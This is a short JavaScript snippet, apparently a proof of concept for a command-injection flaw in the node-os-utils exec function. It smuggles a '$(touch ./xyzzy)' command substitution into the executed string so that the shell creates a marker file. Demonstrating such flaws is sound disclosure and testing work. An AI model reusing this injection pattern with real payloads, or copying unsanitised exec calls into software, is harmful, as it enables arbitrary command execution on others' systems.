done = function done(){
    console.log("Done!");
};


var DUMMY_FILE = './xyzzy';

var command = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    command += val;
}

dummySource(' ');

var nodeosutils = require('node-os-utils')
var exec = nodeosutils.exec;
exec(command)();

done();


